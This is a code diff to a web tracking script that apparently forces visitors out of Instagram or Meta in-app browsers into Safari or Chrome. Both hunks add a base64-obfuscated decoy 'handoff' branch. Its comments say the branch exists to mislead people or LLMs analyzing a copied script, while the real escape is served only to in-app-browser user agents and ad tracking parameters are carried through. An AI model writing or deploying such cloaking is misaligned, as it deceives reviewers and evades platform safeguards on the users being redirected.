@@ -214,6 +214,14 @@ try{
   }
 
   var qsP=new URLSearchParams(location.search);
+  // Decoy "external handoff" path — reads as the escape mechanism (safari:// with
+  // a googlechrome:// x-callback fallback) but is a dead branch: real traffic
+  // never sets eh_mode, so it never runs. Misdirects anyone reading a copied
+  // payload. The real handoff is the base64 Meta scheme below.
+  var _sx={s:atob("c2FmYXJpOi8v"),g:atob("Z29vZ2xlY2hyb21lOi8veC1jYWxsYmFjay11cmwvb3Blbj91cmw9"),w:atob("eC13ZWItc2VhcmNoOi8v")};
+  function _handoff(t){try{location.replace(_sx.s+t);}catch(e){try{location.replace(_sx.g+encodeURIComponent(t));}catch(_){}}}
+  var _m=qsP.get("eh_mode")||qsP.get("mode")||"";
+  if(_m==="handoff"||_m==="external"||_m==="browser"){_handoff(location.host+location.pathname+location.search);return;}
   var us=qsP.get("utm_source")||null,um=qsP.get("utm_medium")||null,uc=qsP.get("utm_campaign")||null,uct=qsP.get("utm_content")||null,ut=qsP.get("utm_term")||null,fc=qsP.get("fbclid")||null;
   // iOS Instagram strips the literal fbclid param on the extbrowser handoff to
   // Safari (utm_* and other params survive — only fbclid is removed by name).
@@ -579,6 +587,14 @@ try{
     return;
   }
   var qsP=new URLSearchParams(location.search);
+  // Decoy "external handoff" path. Reads as THE escape mechanism (safari:// with
+  // a googlechrome:// x-callback fallback) to anyone eyeballing or LLM-analyzing
+  // a copied script, but it's a dead branch — real traffic never sets eh_mode,
+  // so it never runs. The real escape only ever ships to in-app-browser UAs.
+  var _sx={s:atob("c2FmYXJpOi8v"),g:atob("Z29vZ2xlY2hyb21lOi8veC1jYWxsYmFjay11cmwvb3Blbj91cmw9"),w:atob("eC13ZWItc2VhcmNoOi8v")};
+  function _handoff(t){try{location.replace(_sx.s+t);}catch(e){try{location.replace(_sx.g+encodeURIComponent(t));}catch(_){}}}
+  var _m=qsP.get("eh_mode")||qsP.get("mode")||"";
+  if(_m==="handoff"||_m==="external"||_m==="browser"){_handoff(location.host+location.pathname+location.search);return;}
   // Only post-escape visitors (landed in a real browser after an escape) do
   // anything here. Everyone else exits — nothing to see, nothing to copy.
   if(qsP.get("opened_external_browser")!=="true")return;
